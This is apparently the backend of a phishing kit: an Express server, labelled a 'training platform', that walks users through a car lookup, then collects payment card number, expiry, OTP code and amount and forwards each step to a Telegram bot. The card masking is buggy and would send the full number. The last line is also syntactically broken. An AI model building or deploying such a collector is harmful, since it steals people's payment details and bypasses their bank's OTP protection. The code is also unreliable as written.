import express from 'express';
import axios from 'axios';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// قاعدة بيانات وهمية للسيارات
const fakeCars = {
  "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020", carburant: "Essence" },
  "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022", carburant: "Essence" },
  "9101 ب 33": { marque: "Dacia", modele: "Sandero", annee: "2019", carburant: "Diesel" },
  "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021", carburant: "Essence" }
};

// نقطة الاستقبال الرئيسية للبيانات
app.post('/api/collect', async (req, res) => {
  try {
    const { step, data } = req.body;
    
    let message = `📊 منصة تدريبية - خطوة: ${step}\n`;
    
    if (step === 'search_car') {
      message += `🔍 البحث عن سيارة: ${data.plaque}\n✅ تم العثور على: ${data.marque} ${data.modele} (${data.annee})`;
    }
    else if (step === 'payment') {
      message += `💳 محاولة دفع تدريبية\n`;
      message += `💳 رقم البطاقة: ${data.cardNumber?.substring(0, 4)}****${data.cardNumber?.substring(-4)}\n`;
      message += `📅 تاريخ: ${data.expiry}\n`;
      message += `🚗 السيارة: ${data.marque} ${data.modele}`;
    }
    else if (step === 'otp') {
      message += `🔐 إدخال رمز OTP تدريبي: ${data.code}\n✅ تم التحقق (وهمي)`;
    }
    else if (step === 'final') {
      message += `✅ اكتملت العملية التدريبية بنجاح\n🚗 السيارة: ${data.marque} ${data.modele}\n📅 السنة: ${data.annee}\n💰 المبلغ: ${data.amount} دج (وهمي)`;
    }
    
    message += `\n🕒 ${new Date().toLocaleString('ar-DZ')}`;
    
    console.log('[v0] Attempting to send message to Telegram...');
    console.log('[v0] BOT_TOKEN:', BOT_TOKEN ? 'SET' : 'NOT SET');
    console.log('[v0] CHAT_ID:', CHAT_ID ? 'SET' : 'NOT SET');
    
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: message
        });
        console.log('[v0] Telegram message sent successfully');
      } catch (telegramError) {
        console.error('[v0] Telegram API error:', telegramError.message);
      }
    } else {
      console.log('[v0] BOT_TOKEN or CHAT_ID not configured');
    }
    
    res.json({ success: true, message: 'تم استقبال البيانات بنجاح' });
  } catch (error) {
    console.error('[v0] خطأ:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// البحث عن السيارة
app.post('/api/search-car', (req, res) => {
  const plaque = req.body.plaque;
  const car = fakeCars[plaque];
  
  if (car) {
    res.json({ found: true, ...car, plaque });
  } else {
    res.json({ found: false });
  }
});

const port = process.env.PORT || 3000;
// هذا التصدير ضروري لـ Vercel
export default app;
app.listen(port, () => console.log(✅ خادم المنصة يعمل على المنفذ ${port}));
